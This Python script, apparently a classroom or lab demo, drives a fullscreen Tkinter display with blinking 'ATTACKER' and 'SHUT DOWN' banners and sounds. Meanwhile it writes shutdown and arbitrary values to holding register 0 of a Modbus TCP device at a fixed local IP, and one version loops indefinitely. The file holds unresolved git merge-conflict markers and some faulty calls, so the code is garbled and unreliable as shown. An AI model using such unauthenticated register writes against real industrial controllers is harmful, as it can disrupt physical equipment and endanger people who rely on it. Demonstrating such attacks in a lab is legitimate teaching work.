import os
from pymodbus.client import ModbusTcpClient 
from pymodbus.exceptions import ModbusException, ModbusIOException
from random import randint, choice
from time import time
from tkinter import Frame, Label, Tk
from tkinter.font import Font
from vlc import MediaPlayer

FILE =  os.path.abspath(os.path.dirname(__file__)) + "/file/"



def main():
    app = Application(modbus= ModbusTcpClient('192.168.93.85'))
    app.run()
    app.destroy()

class Application(Tk):
    def __init__(
        self,
        modbus: ModbusTcpClient
    ) -> None:
        super().__init__()
        self.configure(background="black")
        self.wm_attributes("-fullscreen", True)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        self.attributes("-topmost", True)

        self.modbus = modbus
    def run(self) -> None:
            self.after(0, self.gui)
            self.mainloop()
        
    def gui(self) -> None:
            # context = WarningContext(self)
            # context.run()
            # context.destroy()
            

            attack_context = Attack(self)
            attack_context.run()
            attack_context.destroy()
            

class Base(Frame):
    def __init__(self, app: Application) -> None:
        self.blinking_texts: list[Label] = []
        super().__init__(app)
        self.configure(background="black")
        self.place_configure(anchor="center", relx=0.5, rely=0.5)

    def run(self) -> None:
        self.after(0, self.gui)
        self.mainloop()

    def start_blinking(self, show_duration: float, hide_duration: float) -> None:
        def show() -> None:
            if self.winfo_exists():
                for text in self.blinking_texts:
                    text.pack_configure()
                self.after(int(show_duration * 1000), hide)

        def hide() -> None:
            if self.winfo_exists():
                for text in self.blinking_texts:
                    text.pack_forget()
                self.after(int(hide_duration * 1000), show)

        self.after(0, show)

    def wait(self, duration: float) -> None:
        end_time = time() + duration
        while time() < end_time:
            self.update()

    def gui(self) -> None:
        pass


class WarningContext(Base):

    AUDIO: MediaPlayer = MediaPlayer(FILE + "warning1.mp3")

    def gui(self) -> None:
        self.AUDIO.play()

        text_warning = Label(
            self,
            text="WARNING",
            background="black",
            foreground="red",
            font=Font(size=200),
        )
        self.blinking_texts.append(text_warning)
        self.start_blinking(1.2, 0.4)
        self.wait(1.6 * 3)

        text_commencing_attack = Label(
            self,
            text="COMMENCING ATTACK",
            background="black",
            foreground="white",
            font=Font(size=80),
        )
        self.blinking_texts.append(text_commencing_attack)
        self.wait(5)

        self.AUDIO.stop()
        #self.quit()
        
class Attack(Base):

    AUDIO_SHD: MediaPlayer = MediaPlayer(FILE + "shutdown.mp3")
    AUDIO_ATK: MediaPlayer = MediaPlayer(FILE + "attacker.mp3")



    def gui(self) -> None:
        values = [1024, 2048, 4096, 8192, 16384]
        client = ModbusTcpClient('192.168.93.85')
        client.connect()
<<<<<<< HEAD
        try:
            # self.AUDIO_SHD.play()
            # self.wait(4)
            # text_shutdown = Label(
            #     self,
            #     text="SHUT DOWN",
            #     background="back",
            #     foreground="yellow",
            #     font=Font(size=200),
            # )
            # self.blinking_texts.append(text_shutdown)
            # self.start_blinking(1.2, 0.4)
            # self.wait(1.6 * 3)
            client.write_register(0, 0)
            response = client.read_holding_registers(0)
            if isinstance(response, ModbusIOException):
                raise response
            
            self.AUDIO_SHD.play()
            self.wait(4)
            text_shutdown = Label(
                self,
                text="SHUT DOWN",
                background="back",
                foreground="yellow",
                font=Font(size=200),
            )
            self.blinking_texts.append(text_shutdown)
            self.start_blinking(1.2, 0.4)
            self.wait(1.6 * 3)
            self.wait(2)
            self.AUDIO_SHD.stop()

            # self.AUDIO_ATK.play()
            # self.wait(4)
            # text_attack = Label(
            # self,
            # text="ATTACKER",
            # background="black",
            # foreground="red",
            # font=Font(size=200),
            # )
            # self.blinking_texts.append(text_attack)
            # self.start_blinking(1.2, 0.4)
            # self.wait(1.6 * 3)
            for i in values:
                
                client.write_register(0, [randint(0,99), randint(0, 99), randint(0, 99)])
                response = client.read_holding_registers(0)
                if isinstance(response, ModbusIOException):
                        raise response
                client.write_register(0,i)
                self.AUDIO_ATK.play()
                self.wait(4)
                text_attack = Label(
                self,
                text="ATTACKER",
                background="black",
                foreground="red",
                font=Font(size=200),
                )
                self.blinking_texts.append(text_attack)
                self.start_blinking(1.2, 0.4)
                self.wait(1.6 * 3)
                self.AUDIO_ATK.stop()


            client.write_register(0, 0)
            response = client.read_holding_registers(0)
            if isinstance(response, ModbusIOException):
                raise response
            
            self.AUDIO_SHD.play()
            self.wait(4)
            text_shutdown = Label(
                self,
                text="SHUT DOWN",
                background="back",
                foreground="yellow",
                font=Font(size=200),
            )
            self.blinking_texts.append(text_shutdown)
            self.start_blinking(1.2, 0.4)
            self.wait(1.6 * 3)
            self.wait(2)
            self.AUDIO_SHD.stop()
        except Exception as error:
            print(error)
        self.quit()
=======


        try:
            # self.AUDIO_SHD.play()

            # text_shutdown = Label(
            #     self,
            #     text="SHUT DOWN",
            #     background="black",
            #     foreground="yellow",
            #     font=Font(size=200),
            # )
            # self.blinking_texts.append(text_shutdown)
            # self.start_blinking(1.2, 0.4)
            # self.wait(1.6 * 3)
            # client.write_register(0, 0)
            # response = client.read_holding_registers(0)
            # if isinstance(response, ModbusIOException):
            #     raise response
            
            # self.wait(2)
            # self.AUDIO_SHD.stop()

            self.AUDIO_ATK.play()
            text_attack = Label(
            self,
            text="HI EVERYONE",
            background="black",
            foreground="red",
            font=Font(size=200),
            )
            while True:
            #for i in range(20):
                self.blinking_texts.append(text_attack)
                self.start_blinking(1.2, 0.4)
                self.wait(1.6 * 3)
                random_value = choice(values)
                client.write_register(0, 1024)
                response = client.read_holding_registers(0)
                if isinstance(response, ModbusIOException):
                        raise response
            # self.AUDIO_ATK.stop()

            # self.AUDIO_SHD.play()

            # text_shutdown = Label(
            #     self,
            #     text="SHUT DOWN",
            #     background="black",
            #     foreground="yellow",
            #     font=Font(size=200),
            # )
            # self.blinking_texts.append(text_shutdown)
            # self.start_blinking(1.2, 0.4)
            # self.wait(1.6 * 3)
            # client.write_register(0, 0)
            # response = client.read_holding_registers(0)
            # if isinstance(response, ModbusIOException):
            #     raise response
            
            # self.AUDIO_SHD.play()
        except Exception as error:
            print(error)
        #self.quit()
>>>>>>> 6fd951ec6446516740ac1f4b84b439d0353ad249
if __name__ == "__main__":
    main()
         